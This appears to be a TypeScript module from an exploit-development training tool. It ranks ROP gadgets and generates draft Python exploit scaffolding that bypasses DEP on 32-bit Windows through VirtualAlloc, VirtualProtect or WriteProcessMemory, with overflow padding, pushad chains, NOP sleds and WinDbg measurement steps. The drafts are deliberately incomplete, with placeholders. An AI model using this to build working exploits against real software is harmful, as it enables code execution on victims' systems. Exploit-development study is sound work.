import { CapabilityIndex } from "../rop/capabilities";
import { rankCandidates } from "../rop/emitter";
import { CapabilityKind, RopGadget } from "../rop/types";
import { DepApi } from "./rop_template";

export type DepPlanStyle = "skeleton" | "pushad";

export const DEP_PLAN_APIS: DepApi[] = ["VirtualAlloc", "VirtualProtect", "WriteProcessMemory"];
export const DEP_PLAN_STYLES: DepPlanStyle[] = ["skeleton", "pushad"];
export const DEP_PLAN_SECTIONS = 7;

export type Constant = { field: string; value: number };

// The argument values the chain has to produce, per API. Addresses known only at run time
// (shellcode, the API itself) are not constants and are measured in the draft instead.
export const CONSTANTS: Record<DepApi, Constant[]> = {
  VirtualAlloc: [
    { field: "dwSize", value: 0x1 },
    { field: "flAllocationType", value: 0x1000 },
    { field: "flProtect", value: 0x40 },
  ],
  VirtualProtect: [
    { field: "dwSize", value: 0x201 },
    { field: "flNewProtect", value: 0x40 },
  ],
  WriteProcessMemory: [
    { field: "hProcess", value: 0xffffffff },
    { field: "nSize", value: 0x210 },
  ],
};

export type Job = {
  key: string;
  title: string;
  capabilities: CapabilityKind[];
  register?: string;
};

const SKELETON_JOBS: Job[] = [
  { key: "capture", title: "capture ESP", capabilities: ["STACK_POINTER_CAPTURE"] },
  { key: "copy", title: "copy a register", capabilities: ["MOVE_REGISTER", "EXCHANGE_REGISTER"] },
  { key: "add", title: "add or subtract", capabilities: ["REGISTER_ADD", "REGISTER_SUB"] },
  { key: "negate", title: "negate", capabilities: ["REGISTER_NEGATE"] },
  { key: "read", title: "read a pointer", capabilities: ["MEMORY_READ"] },
  { key: "write", title: "write a field", capabilities: ["MEMORY_WRITE"] },
  { key: "advance", title: "advance the pointer (inc reg)", capabilities: ["REGISTER_INCREMENT"] },
  { key: "pivot", title: "pivot ESP onto the frame", capabilities: ["STACK_PIVOT"] },
];

const PUSHAD_REGISTERS = ["edi", "esi", "ebp", "ebx", "edx", "ecx", "eax"];

const PUSHAD_JOBS: Job[] = [
  ...PUSHAD_REGISTERS.map((register): Job => ({ key: `pop_${register}`, title: `pop ${register}`, capabilities: ["LOAD_REGISTER"], register })),
  { key: "read", title: "read a pointer (the IAT slot)", capabilities: ["MEMORY_READ"] },
  { key: "pushad", title: "pushad ; ret", capabilities: ["DISPATCH_PUSHAD"] },
];

export function jobsFor(style: DepPlanStyle): Job[] {
  return style === "pushad" ? PUSHAD_JOBS : SKELETON_JOBS;
}

function movesEsp(gadget: RopGadget): boolean {
  return gadget.categories.includes("STACK_PIVOT") || gadget.capabilities.some((capability) => capability.kind === "STACK_PIVOT");
}

function jobCapability(gadget: RopGadget, job: Job) {
  return gadget.capabilities.find((capability) =>
    job.capabilities.includes(capability.kind) && (job.register === undefined || capability.register === job.register));
}

// A gadget that moves ESP only fits the pivot job; anywhere else it throws the chain away.
export function candidates(index: CapabilityIndex, job: Job, count = 3): RopGadget[] {
  const matching = index.gadgets.filter((gadget) =>
    jobCapability(gadget, job) !== undefined && (job.key === "pivot" || !movesEsp(gadget)));
  return rankCandidates(matching).slice(0, count);
}

export function gadgetAddress(gadget: RopGadget): number {
  return gadget.locations.find((location) => location.virtualAddress !== undefined)?.virtualAddress ?? 0;
}

export function hex32(value: number): string {
  return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
}

function sequence(gadget: RopGadget): string {
  return gadget.instructions.map((instruction) => instruction.normalizedText).join(" ; ");
}

// What else a gadget does besides its job: the registers it changes, how far it moves ESP,
// the pops a chain must pad for, and a ret N that skips dwords after it.
export function sideEffects(gadget: RopGadget, job: Job): string {
  const summary = gadget.semanticSummary.summary;
  const written = [...summary.writes.values.exact, ...summary.writes.values.conservative]
    .map(String)
    .filter((register) => !["esp", "eip"].includes(register));
  const deltas = [...summary.stackDelta.values.exact];
  const stack = deltas.length === 1 ? `esp +0x${deltas[0].toString(16)}` : "esp ?";
  const intended = jobCapability(gadget, job)?.register;
  const pops = gadget.instructions.filter((instruction) =>
    instruction.mnemonic === "pop" && instruction.operands[0]?.trim().toLowerCase() !== intended).length;
  const last = gadget.instructions[gadget.instructions.length - 1];
  const retN = last?.mnemonic === "ret" && last.operands.length === 1 ? `ret ${last.operands[0]}` : "";
  const memory = job.key !== "write" && gadget.instructions.some((instruction) =>
    instruction.mnemonic !== "push" && (instruction.operands[0] ?? "").includes("["))
    ? "writes memory" : "";
  return [
    `writes ${written.length > 0 ? [...new Set(written)].join(" ") : "nothing"}`,
    stack,
    pops > 0 ? `${pops} extra pop${pops > 1 ? "s" : ""}` : "",
    retN,
    memory,
  ].filter(Boolean).join(", ");
}

export function candidateLines(gadgets: RopGadget[], job: Job): string[] {
  if (gadgets.length === 0) return [`  ${job.title}: none in the corpus`];
  return [
    `  ${job.title}:`,
    ...gadgets.map((gadget) => `    ${hex32(gadgetAddress(gadget))}  ${sequence(gadget).padEnd(40)}  ${sideEffects(gadget, job)}`),
  ];
}

export type DraftInput = {
  api: DepApi;
  style: DepPlanStyle;
  module: string;
  iatSlot?: number;
  writable?: number;
  cave?: number;
  best: Record<string, RopGadget | undefined>;
  jmpEsp?: number;
};

function slotLine(name: string, value: number | undefined, how: string): string {
  return value === undefined
    ? `${name.padEnd(9)}= 0x????????   # TODO ${how}`
    : `${name.padEnd(9)}= ${hex32(value)}   # ${how}`;
}

function gadgetLine(best: Record<string, RopGadget | undefined>, key: string, title: string): string {
  const gadget = best[key];
  return gadget
    ? `rop += p32(${hex32(gadgetAddress(gadget))})    # ${title}: ${sequence(gadget)}`
    : `rop += p32(0x????????)    # TODO ${title}: no candidate in the corpus`;
}

const FRAME_DWORDS: Record<DepApi, number> = { VirtualAlloc: 6, VirtualProtect: 6, WriteProcessMemory: 7 };

function measureLines(input: DraftInput): string[] {
  const capture = input.best.capture;
  const at = capture ? hex32(gadgetAddress(capture)) : "<capture gadget>";
  return [
    "# TODO measure: distance from the captured ESP to field 1 of the frame",
    `#   bp ${at} ; g ; r esp                      ESP here is the value push esp stores`,
    "#   s -d esp-400 L100 45454545                    address of field 1 (the first dummy)",
    "#   ? <field 1> - <captured ESP>                  negative: pop it into a register, then add",
    "DIST_FIELD1 = ???",
    "# TODO measure: distance from the captured ESP to the shellcode",
    "#   s -b esp L2000 90 90 90 90                    start of the NOP sled",
    "#   ? <sled> - <captured ESP>",
    "DIST_SHELLCODE = ???",
  ];
}

function skeletonFrame(api: DepApi): string[] {
  if (api === "VirtualAlloc") {
    return [
      "frame  = p32(0x45454545)   # VirtualAlloc address   <- [IAT_SLOT]",
      "frame += p32(0x46464646)   # return address         <- shellcode",
      "frame += p32(0x47474747)   # lpAddress              <- shellcode",
      "frame += p32(0x48484848)   # dwSize                 <- 0x1",
      "frame += p32(0x49494949)   # flAllocationType       <- 0x1000",
      "frame += p32(0x51515151)   # flProtect              <- 0x40",
    ];
  }
  if (api === "VirtualProtect") {
    return [
      "frame  = p32(0x45454545)   # VirtualProtect address <- [IAT_SLOT]",
      "frame += p32(0x46464646)   # return address         <- shellcode",
      "frame += p32(0x47474747)   # lpAddress              <- shellcode",
      "frame += p32(0x48484848)   # dwSize                 <- 0x201",
      "frame += p32(0x49494949)   # flNewProtect           <- 0x40",
      "frame += p32(WRITABLE)     # lpflOldProtect         literal when clean",
    ];
  }
  return [
    "frame  = p32(0x45454545)   # WriteProcessMemory     <- [IAT_SLOT]",
    "frame += p32(CAVE)         # return address         literal when clean",
    "frame += p32(0xFFFFFFFF)   # hProcess               literal",
    "frame += p32(CAVE)         # lpBaseAddress          literal when clean",
    "frame += p32(0x46464646)   # lpBuffer               <- shellcode",
    "frame += p32(0x47474747)   # nSize                  <- 0x210",
    "frame += p32(WRITABLE)     # lpNumberOfBytesWritten literal when clean",
  ];
}

function skeletonChain(input: DraftInput): string[] {
  const { best } = input;
  const patched = input.api === "WriteProcessMemory" ? "fields 1, 5 and 6" : input.api === "VirtualProtect" ? "fields 1 to 5" : "fields 1 to 6";
  return [
    'rop  = b""',
    gadgetLine(best, "capture", "capture ESP"),
    gadgetLine(best, "copy", "keep it in a working register"),
    "# working pointer -> field 1: load DIST_FIELD1 with a pop, then",
    gadgetLine(best, "add", "add the distance"),
    "# field 1: the API address",
    "rop += p32(0x????????)    # TODO pop <reg> ; ret, followed by p32(IAT_SLOT) or its rop.construct recipe from [5/7]",
    gadgetLine(best, "read", "read the API address from the slot"),
    gadgetLine(best, "write", "write it into the field"),
    gadgetLine(best, "advance", "advance to the next field, four times").replace(")    #", ") * 4  #"),
    `# repeat load / write / advance for ${patched}, with the recipes from [5/7]`,
    "# and the shellcode address = captured ESP + DIST_SHELLCODE",
    "# move the working pointer back to field 1, then",
    gadgetLine(best, "pivot", "pivot ESP onto field 1"),
  ];
}

function pushadChain(input: DraftInput): string[] {
  const { best } = input;
  const lines = [
    'rop  = b""',
    "# ESI = the API address: read the slot, then move it to ESI",
    gadgetLine(best, "pop_eax", "pop eax"),
    "rop += p32(IAT_SLOT)",
    gadgetLine(best, "read", "read the slot"),
    "rop += p32(0x????????)    # TODO mov esi, eax / xchg eax, esi (rop.query(\"capability\", \"MOVE_REGISTER\"))",
    "# the other registers, in an order where no later gadget overwrites an earlier register:",
    '#   dx @$osed().rop.setup("ebp=<jmp esp> ebx=... edx=... ecx=... edi=<ret> eax=0x90909090", "<bad chars>")',
  ];
  for (const register of ["ebp", "ebx", "edx", "ecx", "edi", "eax"]) {
    lines.push(gadgetLine(best, `pop_${register}`, `pop ${register}`), `rop += p32(0x????????)    # TODO value for ${register.toUpperCase()}, see the map in [6/7]`);
  }
  lines.push(gadgetLine(best, "pushad", "pushad ; ret"));
  if (input.jmpEsp !== undefined) lines.push(`# jmp esp for EBP: ${hex32(input.jmpEsp)}`);
  return lines;
}

export function draftLines(input: DraftInput): string[] {
  const head = [
    "# DRAFT. Verify every field in WinDbg before you trust it. This is not a finished chain:",
    "# the gadgets below are the top-ranked candidate per job, and nothing checked that the",
    "# register one gadget leaves is the register the next one reads.",
    "import struct",
    "def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)",
    "",
    "OFFSET   = ???              # TODO measure: bytes from buffer start to EIP (pattern.create / pattern.offset)",
    slotLine("IAT_SLOT", input.iatSlot, `IAT slot of ${input.api}`),
  ];
  if (input.api !== "VirtualAlloc") head.push(slotLine("WRITABLE", input.writable, "writable dword, from [5/7]"));
  if (input.api === "WriteProcessMemory") head.push(slotLine("CAVE", input.cave, "executable code cave, from [5/7]"));
  head.push("");

  if (input.style === "pushad") {
    return [...head, ...pushadChain(input), "", 'shellcode = b"\\x90" * 16 + b"..."', 'payload = b"A" * OFFSET + rop + shellcode'];
  }
  const frameBytes = FRAME_DWORDS[input.api] * 4;
  return [
    ...head,
    ...measureLines(input),
    "",
    `# frame, ${FRAME_DWORDS[input.api]} dwords just before EIP (bp <first gadget> ; dd esp-${(frameBytes + 4).toString(16)} L${FRAME_DWORDS[input.api]})`,
    ...skeletonFrame(input.api),
    "",
    ...skeletonChain(input),
    "",
    'shellcode = b"\\x90" * 16 + b"..."',
    'payload  = b"A" * (OFFSET - len(frame)) + frame + rop',
    'payload += b"C" * ???        # TODO measure: padding so the shellcode sits at captured ESP + DIST_SHELLCODE',
    "payload += shellcode",
  ];
}
